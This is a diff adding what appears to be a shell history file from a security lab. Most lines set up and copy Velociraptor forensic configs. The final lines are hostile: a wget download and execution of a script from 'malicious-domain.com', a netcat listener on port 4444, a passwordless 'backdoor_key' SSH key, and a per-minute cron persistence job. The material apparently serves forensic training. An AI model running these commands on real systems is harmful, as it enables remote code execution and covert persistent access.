@@ -1,0 +1,29 @@
+exit
+./velociraptor --config /etc/velociraptor/server.config.yaml config client > client.config.yaml
+ls
+mv client.config.yaml /home/champuser/
+ls
+cd /home/champuser/
+ls
+mv server.config.yaml Desktop/
+ls
+cd desktop
+mv client.config.yaml Desktop/
+ls
+pwd
+cd desktop
+cd Desktop
+ls
+sudo nano client.config.yaml 
+exit
+ks
+ls
+exit
+scp server.config.yaml IEUser@10.0.17.72:/C:/Users/IEUser/Desktop
+exit
+wget http://malicious-domain.com/payload.sh
+chmod +x payload.sh
+./payload.sh
+nc -lvp 4444
+ssh-keygen -t rsa -b 4096 -f /root/.ssh/backdoor_key -N ""
+echo "* * * * * /tmp/persistence.sh" | crontab -
